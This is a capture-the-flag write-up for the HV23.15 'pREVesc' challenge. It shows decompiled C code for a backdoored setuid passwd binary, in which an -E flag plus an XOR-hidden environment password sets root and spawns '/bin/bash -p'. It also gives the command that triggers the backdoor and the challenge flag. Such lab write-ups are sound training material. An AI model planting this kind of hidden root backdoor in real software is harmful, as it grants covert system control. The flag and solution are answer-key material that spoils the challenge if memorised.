## [HV23.15] pREVesc (coderion)
### Description
> We recently changed the root password for santa as he always broke our system. However, I think he has hidden some backdoor in there. Please help us find it to save christmas!
### Solution
When logging in with the provided credentials, you can find a "normal" ubuntu 23.04. Running [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) sadly doesnt reveal to much. But when looking at the modified date of the setuid binaries, you can find that the passwd file seemed to be more recent than the others. You can then copy the binary with scp to your local machine. When you decompile the binary, you can find that when using the -E Argument the following code get called:
```c
case 'E':
	setuid(0);
	setgid(0);
	// secret password must be set
	// get SALAMI env
	char *salami = getenv("SALAMI");
	// if env is empty
	if (salami == NULL) {
		// set env
		puts("Why u givin' me no salami?!");
		exit(1);
	}
  int i;
	char key[] = "nevergonnagiveyouup";
  char xor_password[] = "";
  char output[6];

  for (i=0; i<6; i++) {
  	char temp = xor_password[i] ^ key[i];
  	output[i] = temp;
  }
	char password[] ={0x1b, 0x15, 0x18, 0x11, 0x1e, 0x53, 0x5c, 0x4e, 0x1b, 0x16, 0x1a, 0x47, 0x0a, 0x0e, 0x19, 0x15, 0x18, 0x0b, 0x16, 0x4f, 0x0f, 0x0e, 0x00, 0x46, 0x04, 0x00, 0x18, 0x02, 0x05, 0x56, 0x05, 0x5c, 0x08, 0x30, 0x1a, 0x5d, 0x04, 0x58, 0x3b, 0x06, 0x35, 0x0a, 0x22};

	char pw[43];    // pw=https://www.youtube.com/watch?v=dQw4w9WgXcQ
	for (int i = 0; i < sizeof(password); i++) {
		char tmp = password[i] ^ output[i % 6];
		pw[i] = tmp;
	}
	// check da env
	if (strcmp(salami, pw) != 0) {
		printf("Never gonna give you up!\nYou'll never escape the rickroll.");
		exit(1);
	}
	puts("Enjoy your salami!");

  system("/bin/bash -p");
```
When looking at the registers in gdb we can see that the password is: https://www.youtube.com/watch?v=dQw4w9WgXcQ.   
When you then execute 
```bash 
SALAMI=https://www.youtube.com/watch?v=dQw4w9WgXcQ passwd -E
```
 you get the flag.  
A solve.py can be found [here](./15-pREVesc/solve.py).  
  
Flag: **HV23{3v1l_p455wd}**   
